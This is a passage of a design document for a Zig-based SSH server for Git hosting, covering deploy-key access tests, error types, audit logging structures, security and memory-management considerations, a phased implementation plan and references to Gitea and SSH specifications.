    };
    
    // Test access to allowed repo succeeds
    try session_ctx.checkRepoAccess("/owner/allowed-repo.git", .Read);
    
    // Test write access fails (deploy key is read-only)
    try testing.expectError(error.AccessDenied, session_ctx.checkRepoAccess("/owner/allowed-repo.git", .Write));
    
    // Test access to other repo fails
    try testing.expectError(error.AccessDenied, session_ctx.checkRepoAccess("/owner/denied-repo.git", .Read));
}
```

## Error Handling

Enhanced error types:

```zig
pub const SshError = error{
    // Connection errors
    ConnectionRefused,
    ConnectionTimeout,
    TooManyConnections,
    RateLimitExceeded,
    ProxyProtocolError,
    
    // Authentication errors
    AuthenticationFailed,
    KeyNotFound,
    KeyTooWeak,
    KeyTypeNotAllowed,
    UserDisabled,
    InvalidUsername,
    CertificateInvalid,
    CertificateExpired,
    PrincipalNotAllowed,
    PrincipalRequiresCertificate,
    
    // Protocol errors
    InvalidProtocol,
    InvalidCommand,
    UnsupportedCipher,
    CommandNotAllowed,
    
    // System errors
    HostKeyGenerationFailed,
    ShutdownInProgress,
    DatabaseError,
} || error{OutOfMemory};
```

## Monitoring & Observability

### Enhanced Metrics

- Active connections by type (user, deploy, certificate)
- Authentication success/failure rate by method
- Command execution times by verb
- Rate limit hits by IP
- Certificate validation failures
- Key size rejection count
- Proxy protocol errors
- Per-write timeout triggers

### Detailed Audit Logging

```zig
pub const AuditLogger = struct {
    pub fn logAuth(self: *AuditLogger, event: AuthEvent) void {
        const json = std.json.stringify(event, .{}, self.writer) catch return;
        std.log.info("SSH_AUTH: {s}", .{json});
    }
    
    pub fn logCommand(self: *AuditLogger, event: CommandEvent) void {
        const json = std.json.stringify(event, .{}, self.writer) catch return;
        std.log.info("SSH_COMMAND: {s}", .{json});
    }
};

pub const AuthEvent = struct {
    timestamp: i64,
    remote_addr: []const u8,
    username: []const u8,
    auth_method: []const u8, // "publickey", "certificate"
    key_type: ?KeyType,
    key_fingerprint: ?[]const u8,
    certificate_id: ?[]const u8,
    result: []const u8, // "success", "failed"
    failure_reason: ?[]const u8,
    user_id: ?i64,
};

pub const CommandEvent = struct {
    timestamp: i64,
    remote_addr: []const u8,
    user_id: i64,
    key_id: ?i64,
    command: []const u8,
    verb: []const u8,
    repo_path: []const u8,
    exit_code: i32,
    duration_ms: u64,
};
```

## Important Implementation Considerations

### Memory Management
- Use arena allocators for session-scoped data to simplify cleanup
- Be careful with string ownership from database queries - duplicate if needed beyond query lifetime
- Deploy key fingerprints and content need proper cleanup in defer blocks

### Error Handling Patterns
- Distinguish between authentication failures (return specific error) vs system errors (log and return generic error)
- Never expose internal details in authentication failure messages
- Log detailed errors server-side while returning generic errors to clients

### Database Integration
- SSH key lookups should be by fingerprint (indexed)
- User status checks (is_active, prohibit_login, is_deleted) are critical for security
- Deploy keys need special handling as they're repository-specific, not user-wide
- Consider caching frequently accessed data (user status, key mappings) at the session level

### Testing Approach
- Create mock DAOs for testing to avoid circular dependencies
- Test permission integration thoroughly - it's a critical security boundary
- Include tests for user status edge cases (deleted users, prohibited logins)
- Deploy key tests must verify repository-specific access restrictions

### Security Considerations
- Always validate user status after key authentication succeeds
- Deploy keys should never grant admin/owner permissions
- Repository state (archived, mirror) affects write permissions regardless of user permissions
- Rate limiting should track by IP, not by user (since auth happens after connection)

## Phased Implementation Plan

### Phase 1: Core Infrastructure (Foundation)
- Implement `SshServer` struct with hierarchical allocators
- Set up main event loop with `std.posix.poll`
- Implement atomic `ConnectionTracker`
- Complete graceful shutdown with signal handling and listener socket closing
- Validate server lifecycle before adding protocol logic

### Phase 2: Process and I/O Integration
- Implement git command spawning with `std.process.Child`
- Handle `stdin`, `stdout`, `stderr` piping correctly
- Use `waitForSpawn()` to catch command execution errors
- Integrate child process I/O with event loop
- Test with mock git commands

### Phase 3: Security and Authentication Layer
- Implement `RateLimiter` with periodic cleanup task
- Create database integration for key lookups
- Implement permission checks using existing permission system
- Add comprehensive audit logging
- Test all security boundaries

### Phase 4: SSH Protocol Integration
- Create `ssh_wrapper.zig` with C library FFI
- Implement session initialization and cleanup
- Handle authentication callbacks from C library
- Integrate with Zig authentication logic
- Extensive protocol testing with fixed buffer streams

## References

- [Gitea SSH Implementation](https://github.com/go-gitea/gitea/blob/main/modules/ssh/ssh.go)
- [Gitea SSH Settings](https://github.com/go-gitea/gitea/blob/main/modules/setting/ssh.go)
- [Gitea SSH Key Verification](https://github.com/go-gitea/gitea/blob/main/models/asymkey/ssh_key_verify.go)
- [SSH Certificate Authentication](https://github.com/go-gitea/gitea/blob/main/models/asymkey/ssh_key_principals.go)
- [SSH Protocol RFC](https://www.rfc-editor.org/rfc/rfc4253)
- [OpenSSH Certificate Protocol](https://cvsweb.openbsd.org/src/usr.bin/ssh/PROTOCOL.certkeys)
- [Zig Standard Library Documentation](https://ziglang.org/documentation/master/std/)
- [zig-libssh2](https://github.com/allyourcodebase/libssh2-zig) - Build integration for libssh2